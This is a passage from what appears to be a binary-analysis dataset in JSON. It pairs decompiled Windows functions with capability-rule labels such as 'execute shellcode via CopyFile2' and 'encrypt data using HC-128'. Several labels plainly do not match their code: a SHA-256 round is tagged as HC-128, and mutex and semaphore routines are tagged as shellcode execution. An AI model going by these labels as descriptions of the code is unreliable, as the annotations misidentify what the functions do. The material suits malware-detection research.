1;\n                    } while (puVar11 < puVar2);\n                    *(puVar8 + iVar16) = uVar9 >> 0x20;\n                    puVar8 = puVar8 + 1;\n                    if (puVar1 <= puVar15) goto code_r0x000140019273;\n                }\n                puVar8 = puVar8 + 1;\n            } while (puVar15 < puVar1);\n        }\ncode_r0x000140019273:\n        if (0 < iVar12) {\n            do {\n                puVar8 = puVar13 + -1;\n                puVar13 = puVar13 + -1;\n                if (*puVar8 != 0) break;\n                iVar12 = iVar12 + -1;\n            } while (iVar12 != 0);\n        }\n        *(iVar7 + 0x14) = iVar12;\n    }\n    return iVar7;\n}\n",
        "token_count": 801
    },
    "1400194b": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint64_t fcn.1400194b0(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint8_t uVar7;\n    int32_t iVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    uint64_t arg1_00;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    uint32_t *puVar14;\n    uint32_t *puVar15;\n    uint32_t *puVar16;\n    uint32_t *puVar17;\n    \n    arg1_00 = *(arg1 + 8);\n    iVar13 = arg2 >> 5;\n    iVar12 = *(arg1 + 0x14) + iVar13;\n    iVar1 = iVar12 + 1;\n    iVar8 = *(arg1 + 0xc);\n    if (*(arg1 + 0xc) < iVar1) {\n        do {\n            iVar6 = iVar8 * 2;\n            arg1_00 = arg1_00 + 1;\n            iVar5 = iVar8 * -2;\n            iVar8 = iVar6;\n        } while (iVar1 != iVar6 && SBORROW4(iVar1, iVar6) == iVar1 + iVar5 < 0);\n    }\n    iVar9 = fcn.140018e70(arg1_00);\n    if (iVar9 != 0) {\n        puVar2 = iVar9 + 0x18;\n        puVar16 = puVar2;\n        if (0 < iVar13) {\n            puVar16 = puVar2 + iVar13;\n            sub.msvcrt.dll_memset(puVar2, 0, iVar13 * 4);\n        }\n        puVar15 = arg1 + 0x18;\n        puVar2 = puVar15 + *(arg1 + 0x14);\n        uVar7 = arg2 & 0x1f;\n        if ((arg2 & 0x1f) == 0) {\n            do {\n                puVar14 = puVar16 + 1;\n                puVar17 = puVar15 + 1;\n                *puVar16 = *puVar15;\n                if (puVar2 <= puVar17) break;\n                puVar16 = puVar16 + 2;\n                puVar15 = puVar15 + 2;\n                *puVar14 = *puVar17;\n            } while (puVar15 < puVar2);\n        }\n        else {\n            uVar11 = 0;\n            puVar17 = puVar16;\n            do {\n                puVar14 = puVar15 + 1;\n                *puVar17 = *puVar15 << uVar7 | uVar11;\n                uVar3 = *puVar15;\n                uVar4 = 0x20 - uVar7 & 0x1f;\n                uVar11 = uVar3 >> uVar4;\n                puVar15 = puVar14;\n                puVar17 = puVar17 + 1;\n            } while (puVar14 < puVar2);\n            iVar10 = (puVar2 + (-0x19 - arg1) & 0xfffffffffffffffcU) + 4;\n            if (puVar2 < arg1 + 0x19U) {\n                iVar10 = 4;\n            }\n            if (uVar3 >> uVar4 != 0) {\n                iVar12 = iVar1;\n            }\n            *(puVar16 + iVar10) = uVar11;\n        }\n        *(iVar9 + 0x14) = iVar12;\n        fcn.140018f70(arg1);\n    }\n    return iVar9;\n}\n",
        "token_count": 833
    },
    "140001d2": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid fcn.140001d28(uint64_t *arg1, uint64_t *arg2, uint32_t *arg3)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    \n    uVar2 = (*arg3 | *arg3 << 0x10) & 0xffff0000ffff;\n    uVar4 = (arg3[1] << 0x10 | arg3[1]) & 0xffff0000ffff;\n    uVar3 = (arg3[2] | arg3[2] << 0x10) & 0xffff0000ffff;\n    uVar1 = (arg3[3] | arg3[3] << 0x10) & 0xffff0000ffff;\n    *arg1 = ((uVar3 | uVar3 << 8) & 0xff00ff00ff00ff) << 8 | (uVar2 | uVar2 << 8) & 0xff00ff00ff00ff;\n    *arg2 = ((uVar1 | uVar1 << 8) & 0xff00ff00ff00ff) << 8 | (uVar4 | uVar4 << 8) & 0xff00ff00ff00ff;\n    return;\n}\n",
        "token_count": 296
    },
    "1400113f": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.1400113f0(void)\n\n{\n    uint8_t uVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    uchar *puVar5;\n    char *pcVar6;\n    char cVar7;\n    uint *puVar8;\n    char *pcVar9;\n    uint64_t uVar10;\n    bool bVar11;\n    uint uStack28;\n    \n    uStack28 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    puVar8 = &uStack28;\n    pcVar6 = 0x1400ee180;\n    do {\n        uVar1 = *puVar8;\n        puVar8 = puVar8 + 1;\n        pcVar6[1] = (uVar1 & 0xf) + 0x61;\n        *pcVar6 = (uVar1 >> 4) + 0x41;\n        pcVar6 = pcVar6 + 2;\n    } while (puVar8 != &stack0xffffffffffffffe8);\n    cVar7 = '_';\n    pcVar9 = \"__shmem3_winpthreads_tdm_\";\n    pcVar6 = 0x1400ee188;\n    while( true ) {\n        pcVar9 = pcVar9 + 1;\n        *pcVar6 = cVar7;\n        if (pcVar6 + 1 == 0x1400ee1a2) break;\n        cVar7 = *pcVar9;\n        pcVar6 = pcVar6 + 1;\n    }\n    cVar7 = '_';\n    pcVar9 = \"__shmem3_winpthreads_tdm_\";\n    pcVar6 = 0x1400ee1c0;\n    while( true ) {\n        pcVar9 = pcVar9 + 1;\n        *pcVar6 = cVar7;\n        if (pcVar6 + 1 == 0x1400ee1d9) break;\n        cVar7 = *pcVar9;\n        pcVar6 = pcVar6 + 1;\n    }\n    *0x1400ee1d9 = 0x2d;\n    *0x1400ee1e2 = 0x6161616161616161;\n    *0x1400ee1f2 = 0x6161616161616161;\n    *0x1400ee202 = 0x6161616161616161;\n    *0x1400ee212 = 0x6161616161616161;\n    *0x1400ee1da = 0x6161616161616161;\n    *0x1400ee1ea = 0x6161616161616161;\n    *0x1400ee1fa = 0x6161616161616161;\n    *0x1400ee20a = 0x6161616161616161;\n    *0x1400ee21a = 0;\n    uVar4 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0, 0x1400ee180);\n    iVar3 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar4);\n    if (iVar3 != 0) {\n        fcn.140011270(\"failed to to lock creation mutex\\n\");\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n        return 0;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_FindAtomA)();\n    if (iVar2 == 0) {\n        puVar5 = 0x1400ee1da;\n        do {\n            if ((0x1400ee0c0U >> (0x400ee21a - puVar5 & 0x3f) & 1) != 0) {\n                *puVar5 = 0x41;\n            }\n            puVar5 = puVar5 + 1;\n        } while (puVar5 != 0x1400ee21a);\n        iVar2 = (*_sym.imp.KERNEL32.dll_AddAtomA)(0x1400ee1c0);\n        if (iVar2 == 0) {\n            fcn.140011270(\"failed to add string to atom table\\n\");\n            return 0;\n        }\n        *0x1400ee0c0 = 0x1400ee0c0;\n        sub.msvcrt.dll__onexit(0x140011300);\n    }\n    else {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetAtomNameA)(iVar2, 0x1400ee1c0, 0x5b);\n        uVar10 = 0;\n        pcVar6 = 0x1400ee1da;\n        if (iVar3 == 0) {\n            fcn.140011270(\"failed to get string from atom\\n\");\n            uVar10 = 0;\n            *0x1400ee0c0 = uVar10;\n        }\n        else {\n            do {\n                if (*pcVar6 == 'A') {\n                    uVar10 = uVar10 | 1 << (0x1aU - pcVar6 & 0x3f);\n                }\n                pcVar6 = pcVar6 + 1;\n                *0x1400ee0c0 = uVar10;\n            } while (pcVar6 != 0x1400ee21a);\n        }\n        do {\n            if (*(uVar10 + 8) == 0) {\n                if (uVar10 != 0x1400ee0c0) {\n                    *(uVar10 + 8) = 0x1400ee0c0;\n                    sub.msvcrt.dll__onexit(0x140011300);\n                }\n                break;\n            }\n            bVar11 = uVar10 != 0x1400ee0c0;\n            uVar10 = *(uVar10 + 8);\n        } while (bVar11);\n    }\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(uVar4);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n    return *0x1400ee0c0;\n}\n",
        "token_count": 1343
    },
    "140013e8": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.140013e80(int32_t **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    ulong uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    if ((arg1 == NULL) || (piVar2 = *arg1,  piVar2 == NULL)) {\n        return 0x16;\n    }\n    if (piVar2 == 0xffffffffffffffff) {\n        return 0;\n    }\n    iVar4 = 0x16;\n    if (*piVar2 == -0x3f454e03) {\n        piVar1 = piVar2 + 6;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(piVar1);\n        iVar4 = piVar2[3];\n        if (iVar4 == 0) {\n            if (piVar2[2] != piVar2[4] && piVar2[4] <= piVar2[2]) {\n                iVar4 = fcn.140013b90(*(piVar2 + 0x2a), 1, 0xffffffff, piVar2 + 0x1c);\n                if (iVar4 == 0) {\n                    iVar4 = piVar2[4];\n                    iVar5 = piVar2[2];\n                    if (iVar4 != 0) {\n                        piVar2[4] = 0;\n                        iVar5 = iVar5 - iVar4;\n                    }\n                    piVar2[3] = 1;\n                    piVar2[2] = iVar5 + -1;\n                    goto code_r0x0001400132f0;\n                }\n            }\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(piVar1);\n        }\n        else {\n            if (piVar2[2] != 0) {\n                piVar2[2] = piVar2[2] + -1;\n                piVar2[3] = iVar4 + 1;\ncode_r0x0001400132f0:\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(piVar1);\n                uVar3 = *(piVar2 + 0x28);\n                piVar1 = piVar2 + 0x1a;\n                piVar2 = piVar2 + 0x10;\n                (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(piVar2);\n                iVar4 = *piVar1;\n                if (0x7fffffff < iVar4 + 1) {\n                    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(piVar2);\n                    return 0x22;\n                }\n                LOCK();\n                *piVar1 = *piVar1 + 1;\n                if (iVar4 < 0) {\n                    iVar5 = -iVar4;\n                    if (1 < -iVar4) {\n                        iVar5 = 1;\n                    }\n                    iVar4 = (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(uVar3, iVar5, 0);\n                    if (iVar4 == 0) {\n                        LOCK();\n                        *piVar1 = *piVar1 + -1;\n                        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(piVar2);\n                        return 0x16;\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(piVar2);\n                return 0;\n            }\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(piVar1);\n            iVar4 = 0;\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 760
    },
    "14001411": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.140014110(int32_t **arg1, ulong arg2)\n\n{\n    int32_t *arg4;\n    code *pcVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    ulong *puVar4;\n    int64_t *piVar5;\n    int32_t *piVar6;\n    uint32_t uStack124;\n    int32_t *piStack120;\n    ulong uStack112;\n    uint32_t *puStack104;\n    code *pcStack88;\n    int32_t **ppiStack80;\n    ulong uStack72;\n    \n    if (arg1 == NULL) {\n        return 0x16;\n    }\n    piVar6 = *arg1;\n    uVar3 = 0x16;\n    if (piVar6 != NULL) {\n        if (piVar6 == 0xffffffffffffffff) {\n            uVar3 = fcn.140013760(arg1);\n            uStack124 = uVar3;\n            if ((uVar3 & 0xffffffef) != 0) {\n                return uVar3;\n            }\n            piVar6 = *arg1;\n        }\n        else if (*piVar6 != -0x3f454e03) {\n            return 0x16;\n        }\n        pcVar1 = _sym.imp.KERNEL32.dll_TryEnterCriticalSection;\n        arg4 = piVar6 + 0x1c;\n        while( true ) {\n            uVar3 = fcn.140013b90(*(piVar6 + 0x2a), 0, 0xffffffff, arg4);\n            uStack124 = uVar3;\n            if (uStack124 != 0) break;\n            iVar2 = (*pcVar1)(piVar6 + 6);\n            if (iVar2 != 0) {\n                piVar6[2] = piVar6[2] + 1;\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(piVar6 + 6);\n                uVar3 = fcn.1400132f0(*(piVar6 + 0x2a), 1, arg4, piVar6 + 0x26);\n                uStack124 = uVar3;\n                if (uStack124 != 0) {\n                    return uVar3;\n                }\n                puStack104 = &uStack124;\n                pcStack88 = 0x1400142f0;\n                ppiStack80 = &piStack120;\n                piStack120 = piVar6;\n                uStack112 = arg2;\n                puVar4 = fcn.14000f7f0();\n                uStack72 = *puVar4;\n                piVar5 = fcn.14000f7f0();\n                *piVar5 = &pcStack88;\n                uStack124 = fcn.140011d40(arg2);\n                if (uStack124 == 0) {\n                    uStack124 = fcn.140013b90(*(piVar6 + 0x28), 0, 0xffffffff, piVar6 + 0x10);\n                }\n                puVar4 = fcn.14000f7f0();\n                *puVar4 = uStack72;\n                (*pcStack88)(ppiStack80);\n                return uStack124;\n            }\n            uVar3 = fcn.1400132f0(*(piVar6 + 0x2a), 1, arg4, piVar6 + 0x26);\n            uStack124 = uVar3;\n            if (uStack124 != 0) {\n                return uVar3;\n            }\n            fcn.140014a50();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 801
    },
    "14001468": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000140014510)\n\nuint64_t fcn.140014680(int32_t **arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t *arg4;\n    code *pcVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    ulong *puVar4;\n    int64_t *piVar5;\n    int32_t *piVar6;\n    uint64_t arg3_00;\n    uint32_t uStack124;\n    int32_t *piStack120;\n    ulong uStack112;\n    uint32_t *puStack104;\n    code *pcStack88;\n    int32_t **ppiStack80;\n    ulong uStack72;\n    \n    if (arg1 == NULL) {\n        return 0x16;\n    }\n    piVar6 = *arg1;\n    uVar3 = 0x16;\n    if (piVar6 != NULL) {\n        if (piVar6 == 0xffffffffffffffff) {\n            uVar3 = fcn.140013760(arg1);\n            uStack124 = uVar3;\n            if ((uVar3 & 0xffffffef) != 0) {\n                return uVar3;\n            }\n            piVar6 = *arg1;\n        }\n        else if (*piVar6 != -0x3f454e03) {\n            return 0x16;\n        }\n        uVar3 = fcn.1400117c0(arg3);\n        pcVar1 = _sym.imp.KERNEL32.dll_TryEnterCriticalSection;\n        arg3_00 = uVar3 & 0xffffffff;\n        if (0xfffffffe < uVar3) {\n            arg3_00 = 0xffffffff;\n        }\n        arg4 = piVar6 + 0x1c;\n        while( true ) {\n            uVar3 = fcn.140013b90(*(piVar6 + 0x2a), 0, 0xffffffff, arg4);\n            uStack124 = uVar3;\n            if (uStack124 != 0) break;\n            iVar2 = (*pcVar1)(piVar6 + 6);\n            if (iVar2 != 0) {\n                piVar6[2] = piVar6[2] + 1;\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(piVar6 + 6);\n                uVar3 = fcn.1400132f0(*(piVar6 + 0x2a), 1, arg4, piVar6 + 0x26);\n                uStack124 = uVar3;\n                if (uStack124 != 0) {\n                    return uVar3;\n                }\n                puStack104 = &uStack124;\n                pcStack88 = 0x1400142f0;\n                ppiStack80 = &piStack120;\n                piStack120 = piVar6;\n                uStack112 = arg2;\n                puVar4 = fcn.14000f7f0();\n                uStack72 = *puVar4;\n                piVar5 = fcn.14000f7f0();\n                *piVar5 = &pcStack88;\n                uStack124 = fcn.140011d40(arg2);\n                if (uStack124 == 0) {\n                    uStack124 = fcn.140013b90(*(piVar6 + 0x28), 0, arg3_00, piVar6 + 0x10);\n                }\n                puVar4 = fcn.14000f7f0();\n                *puVar4 = uStack72;\n                (*pcStack88)(ppiStack80);\n                return uStack124;\n            }\n            uVar3 = fcn.1400132f0(*(piVar6 + 0x2a), 1, arg4, piVar6 + 0x26);\n            uStack124 = uVar3;\n            if (uStack124 != 0) {\n                return uVar3;\n            }\n            fcn.140014a50();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 885
    },
    "14000309": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.14000309a(uint32_t *arg1, uint32_t *arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t *puVar6;\n    uint32_t *puVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t auStack328 [66];\n    \n    uVar12 = arg2[7];\n    uVar9 = *arg2;\n    uVar3 = arg2[1];\n    uVar5 = arg2[2];\n    auStack328[7] = uVar12 >> 0x18 | (uVar12 & 0xff0000) >> 8 | (uVar12 & 0xff00) << 8 | uVar12 << 0x18;\n    uVar12 = arg2[3];\n    uVar8 = arg2[4];\n    auStack328[0] = uVar9 >> 0x18 | (uVar9 & 0xff0000) >> 8 | (uVar9 & 0xff00) << 8 | uVar9 << 0x18;\n    uVar9 = arg2[5];\n    uVar14 = arg2[6];\n    auStack328[1] = uVar3 >> 0x18 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar3 << 0x18;\n    auStack328[2] = uVar5 >> 0x18 | (uVar5 & 0xff0000) >> 8 | (uVar5 & 0xff00) << 8 | uVar5 << 0x18;\n    auStack328[3] = uVar12 >> 0x18 | (uVar12 & 0xff0000) >> 8 | (uVar12 & 0xff00) << 8 | uVar12 << 0x18;\n    auStack328[4] = uVar8 >> 0x18 | (uVar8 & 0xff0000) >> 8 | (uVar8 & 0xff00) << 8 | uVar8 << 0x18;\n    uVar12 = arg2[8];\n    auStack328[6] = uVar14 >> 0x18 | (uVar14 & 0xff0000) >> 8 | (uVar14 & 0xff00) << 8 | uVar14 << 0x18;\n    auStack328[5] = uVar9 >> 0x18 | (uVar9 & 0xff0000) >> 8 | (uVar9 & 0xff00) << 8 | uVar9 << 0x18;\n    auStack328[8] = uVar12 >> 0x18 | (uVar12 & 0xff0000) >> 8 | (uVar12 & 0xff00) << 8 | uVar12 << 0x18;\n    uVar12 = arg2[9];\n    auStack328[9] = uVar12 >> 0x18 | (uVar12 & 0xff0000) >> 8 | (uVar12 & 0xff00) << 8 | uVar12 << 0x18;\n    uVar12 = arg2[10];\n    auStack328[10] = uVar12 >> 0x18 | (uVar12 & 0xff0000) >> 8 | (uVar12 & 0xff00) << 8 | uVar12 << 0x18;\n    uVar12 = arg2[0xb];\n    auStack328[11] = uVar12 >> 0x18 | (uVar12 & 0xff0000) >> 8 | (uVar12 & 0xff00) << 8 | uVar12 << 0x18;\n    uVar12 = arg2[0xc];\n    auStack328[12] = uVar12 >> 0x18 | (uVar12 & 0xff0000) >> 8 | (uVar12 & 0xff00) << 8 | uVar12 << 0x18;\n    uVar12 = arg2[0xd];\n    auStack328[13] = uVar12 >> 0x18 | (uVar12 & 0xff0000) >> 8 | (uVar12 & 0xff00) << 8 | uVar12 << 0x18;\n    uVar12 = arg2[0xe];\n    auStack328[14] = uVar12 >> 0x18 | (uVar12 & 0xff0000) >> 8 | (uVar12 & 0xff00) << 8 | uVar12 << 0x18;\n    uVar12 = arg2[0xf];\n    auStack328[15] = uVar12 >> 0x18 | (uVar12 & 0xff0000) >> 8 | (uVar12 & 0xff00) << 8 | uVar12 << 0x18;\n    puVar6 = auStack328;\n    do {\n        uVar12 = puVar6[0xe];\n        uVar9 = puVar6[1];\n        puVar7 = puVar6 + 1;\n        puVar6[0x10] = ((uVar9 << 0xe | uVar9 >> 0x12) ^ (uVar9 >> 7 | uVar9 << 0x19) ^ uVar9 >> 3) +\n                       (uVar12 >> 10 ^ (uVar12 << 0xd | uVar12 >> 0x13) ^ (uVar12 << 0xf | uVar12 >> 0x11)) +\n                       *puVar6 + puVar6[9];\n        puVar6 = puVar7;\n    } while (auStack328 + 0x30 != puVar7);\n    uVar1 = arg1[4];\n    uVar2 = *arg1;\n    iVar4 = (~uVar1 & arg1[6] ^ arg1[5] & uVar1) +\n            arg1[7] + 0x428a2f98 +\n            ((uVar1 >> 0xb | uVar1 << 0x15) ^ (uVar1 >> 6 | uVar1 << 0x1a) ^ (uVar1 << 7 | uVar1 >> 0x19)) +\n            auStack328[0];\n    uVar9 = arg1[3] + iVar4;\n    uVar11 = ((arg1[1] ^ arg1[2]) & uVar2 ^ arg1[1] & arg1[2]) +\n             ((uVar2 >> 0xd | uVar2 << 0x13) ^ (uVar2 >> 2 | uVar2 << 0x1e) ^ (uVar2 << 10 | uVar2 >> 0x16)) + iVar4;\n    iVar4 = (uVar1 & uVar9 ^ ~uVar9 & arg1[5]) +\n            ((uVar9 >> 0xb | uVar9 * 0x200000) ^ (uVar9 >> 6 | uVar9 * 0x4000000) ^ (uVar9 * 0x80 | uVar9 >> 0x19)) +\n            auStack328[1] + 0x71374491 + arg1[6];\n    uVar8 = arg1[2] + iVar4;\n    uVar3 = ((arg1[1] ^ uVar2) & uVar11 ^ arg1[1] & uVar2) +\n            ((uVar11 >> 0xd | uVar11 * 0x80000) ^ (uVar11 >> 2 | uVar11 * 0x40000000) ^\n            (uVar11 * 0x400 | uVar11 >> 0x16)) + iVar4;\n    iVar4 = (uVar9 & uVar8 ^ ~uVar8 & uVar1) +\n            auStack328[2] + 0xb5c0fbcf + arg1[5] +\n            ((uVar8 * 0x80 | uVar8 >> 0x19) ^ (uVar8 >> 0xb | uVar8 * 0x200000) ^ (uVar8 >> 6 | uVar8 * 0x4000000));\n    uVar14 = arg1[1] + iVar4;\n    uVar5 = ((uVar2 ^ uVar11) & uVar3 ^ uVar2 & uVar11) +\n            ((uVar3 >> 0xd | uVar3 * 0x80000) ^ (uVar3 >> 2 | uVar3 * 0x40000000) ^ (uVar3 * 0x400 | uVar3 >> 0x16)) +\n            iVar4;\n    iVar4 = (~uVar14 & uVar9 ^ uVar8 & uVar14) +\n            ((uVar14 >> 0xb | uVar14 * 0x200000) ^ (uVar14 >> 6 | uVar14 * 0x4000000) ^ (uVar14 * 0x80 | uVar14 >> 0x19)\n            ) + auStack328[3] + 0xe9b5dba5 + uVar1;\n    uVar12 = uVar2 + iVar4;\n    uVar10 = iVar4 + ((uVar11 ^ uVar3) & uVar5 ^ uVar11 & uVar3) +\n                     ((uVar5 >> 0xd | uVar5 * 0x80000) ^ (uVar5 >> 2 | uVar5 * 0x40000000) ^\n                     (uVar5 * 0x400 | uVar5 >> 0x16));\n    iVar4 = (~uVar12 & uVar8 ^ uVar14 & uVar12) +\n            auStack328[4] + 0x3956c25b + uVar9 +\n            ((uVar12 >> 0xb | uVar12 * 0x200000) ^ (uVar12 >> 6 | uVar12 * 0x4000000) ^ (uVar12 * 0x80 | uVar12 >> 0x19)\n            );\n    uVar11 = uVar11 + iVar4;\n    uVar9 = iVar4 + ((uVar3 ^ uVar5) & uVar10 ^ uVar3 & uVar5) +\n                    ((uVar10 >> 0xd | uVar10 * 0x80000) ^ (uVar10 >> 2 | uVar10 * 0x40000000) ^\n                    (uVar10 * 0x400 | uVar10 >> 0x16));\n    iVar4 = (~uVar11 & uVar14 ^ uVar12 & uVar11) +\n            auStack328[5] + 0x59f111f1 + uVar8 +\n            ((uVar11 >> 0xb | uVar11 * 0x200000) ^ (uVar11 >> 6 | uVar11 * 0x4000000) ^ (uVar11 * 0x80 | uVar11 >> 0x19)\n            );\n    uVar3 = uVar3 + iVar4;\n    uVar8 = iVar4 + ((uVar5 ^ uVar10) & uVar9 ^ uVar5 & uVar10) +\n                    ((uVar9 >> 0xd | uVar9 * 0x80000) ^ (uVar9 >> 2 | uVar9 * 0x40000000) ^\n                    (uVar9 * 0x400 | uVar9 >> 0x16));\n    iVar4 = (~uVar3 & uVar12 ^ uVar11 & uVar3) +\n            auStack328[6] + 0x923f82a4 + uVar14 +\n            ((uVar3 >> 0xb | uVar3 * 0x200000) ^ (uVar3 >> 6 | uVar3 * 0x4000000) ^ (uVar3 * 0x80 | uVar3 >> 0x19));\n    uVar5 = uVar5 + iVar4;\n    uVar14 = iVar4 + ((uVar10 ^ uVar9) & uVar8 ^ uVar10 & uVar9) +\n                     ((uVar8 >> 0xd | uVar8 * 0x80000) ^ (uVar8 >> 2 | uVar8 * 0x40000000) ^\n                     (uVar8 * 0x400 | uVar8 >> 0x16));\n    iVar4 = (~uVar5 & uVar11 ^ uVar3 & uVar5) +\n            auStack328[7] + 0xab1c5ed5 + uVar12 +\n            ((uVar5 >> 0xb | uVar5 * 0x200000) ^ (uVar5 >> 6 | uVar5 * 0x4000000) ^ (uVar5 * 0x80 | uVar5 >> 0x19));\n    uVar10 = uVar10 + iVar4;\n    uVar15 = iVar4 + ((uVar9 ^ uVar8) & uVar14 ^ uVar9 & uVar8) +\n                     ((uVar14 >> 0xd | uVar14 * 0x80000) ^ (uVar14 >> 2 | uVar14 * 0x40000000) ^\n                     (uVar14 * 0x400 | uVar14 >> 0x16));\n    iVar4 = (~uVar10 & uVar3 ^ uVar5 & uVar10) +\n            auStack328[8] + 0xd807aa98 + uVar11 +\n            ((uVar10 >> 0xb | uVar10 * 0x200000) ^ (uVar10 >> 6 | uVar10 * 0x4000000) ^ (uVar10 * 0x80 | uVar10 >> 0x19)\n            );\n    uVar9 = uVar9 + iVar4;\n    uVar11 = iVar4 + ((uVar8 ^ uVar14) & uVar15 ^ uVar8 & uVar14) +\n                     ((uVar15 >> 0xd | uVar15 * 0x80000) ^ (uVar15 >> 2 | uVar15 * 0x40000000) ^\n                     (uVar15 * 0x400 | uVar15 >> 0x16));\n    iVar4 = (~uVar9 & uVar5 ^ uVar10 & uVar9) +\n            auStack328[9] + 0x12835b01 + uVar3 +\n            ((uVar9 >> 0xb | uVar9 * 0x200000) ^ (uVar9 >> 6 | uVar9 * 0x4000000) ^ (uVar9 * 0x80 | uVar9 >> 0x19));\n    uVar8 = uVar8 + iVar4;\n    uVar12 = iVar4 + ((uVar14 ^ uVar15) & uVar11 ^ uVar14 & uVar15) +\n                     ((uVar11 >> 0xd | uVar11 * 0x80000) ^ (uVar11 >> 2 | uVar11 * 0x40000000) ^\n                     (uVar11 * 0x400 | uVar11 >> 0x16));\n    iVar4 = (~uVar8 & uVar10 ^ uVar9 & uVar8) +\n            auStack328[10] + 0x243185be + uVar5 +\n            ((uVar8 >> 0xb | uVar8 * 0x200000) ^ (uVar8 >> 6 | uVar8 * 0x4000000) ^ (uVar8 * 0x80 | uVar8 >> 0x19));\n    uVar14 = uVar14 + iVar4;\n    uVar3 = iVar4 + ((uVar15 ^ uVar11) & uVar12 ^ uVar15 & uVar11) +\n                    ((uVar12 >> 0xd | uVar12 * 0x80000) ^ (uVar12 >> 2 | uVar12 * 0x40000000) ^\n                    (uVar12 * 0x400 | uVar12 >> 0x16));\n    iVar4 = (~uVar14 & uVar9 ^ uVar8 & uVar14) +\n            auStack328[11] + 0x550c7dc3 + uVar10 +\n            ((uVar14 >> 0xb | uVar14 * 0x200000) ^ (uVar14 >> 6 | uVar14 * 0x4000000) ^ (uVar14 * 0x80 | uVar14 >> 0x19)\n            );\n    uVar15 = uVar15 + iVar4;\n    uVar5 = iVar4 + ((uVar11 ^ uVar12) & uVar3 ^ uVar11 & uVar12) +\n                    ((uVar3 >> 0xd | uVar3 * 0x80000) ^ (uVar3 >> 2 | uVar3 * 0x40000000) ^\n                    (uVar3 * 0x400 | uVar3 >> 0x16));\n    iVar4 = (~uVar15 & uVar8 ^ uVar14 & uVar15) +\n            auStack328[12] + 0x72be5d74 + uVar9 +\n            ((uVar15 >> 0xb | uVar15 * 0x200000) ^ (uVar15 >> 6 | uVar15 * 0x4000000) ^ (uVar15 * 0x80 | uVar15 >> 0x19)\n            );\n    uVar11 = uVar11 + iVar4;\n    uVar10 = iVar4 + ((uVar12 ^ uVar3) & uVar5 ^ uVar12 & uVar3) +\n                     ((uVar5 >> 0xd | uVar5 * 0x80000) ^ (uVar5 >> 2 | uVar5 * 0x40000000) ^\n                     (uVar5 * 0x400 | uVar5 >> 0x16));\n    iVar4 = (~uVar11 & uVar14 ^ uVar15 & uVar11) +\n            auStack328[13] + 0x80deb1fe + uVar8 +\n            ((uVar11 >> 0xb | uVar11 * 0x200000) ^ (uVar11 >> 6 | uVar11 * 0x4000000) ^ (uVar11 * 0x80 | 